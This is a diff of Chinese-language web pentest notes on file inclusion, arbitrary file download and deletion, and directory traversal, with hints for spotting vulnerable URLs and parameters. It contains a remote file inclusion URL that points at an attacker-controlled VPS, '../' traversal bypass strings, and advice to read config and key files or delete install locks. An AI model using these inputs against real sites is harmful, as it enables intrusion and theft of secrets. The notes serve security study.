@@ -35,26 +35,41 @@ http://xxx.com/include.php?file=http://your vps.com/1.txt
 # 文件安全-下载&删除-黑白盒
 1、下载=读取
 常规下载URL：http://www.xxx.com/upload/123.pdf
+
 可能存在安全URL：http://www.xxx.com/xx.xx?file=123.pdf
+
 利用：常规下载敏感文件（数据库配置、中间件配置、系统密钥等文件信息）
+
 2、文件删除（常出现在后台中）
+
 可能存在的安全问题：前台或后台有删除功能应用
+
 利用：常规删除重装锁定配合程序重装或高危操作
 
 # 目录安全-遍历&穿越-黑白盒
 1、目录遍历
+
 目录权限控制不当，通过遍历获取到有价值的信息文件去利用
+
 2、目录穿越（常出现在后台中）
+
 ../../../../../绕过
+
 ![../../../绕过](1.png)
 
 # 黑盒分析
 1、功能点
+
 文件上传，文件下载，文件删除，文件管理器等地方
+
 2、URL特征
+
 文件名：
+
 download,down,readfile,read,del,dir,path,src,Lang等
+
 参数名：
+
 file,path,data,filepath,readfile,data,url,realpath等
 
 # 白盒分析
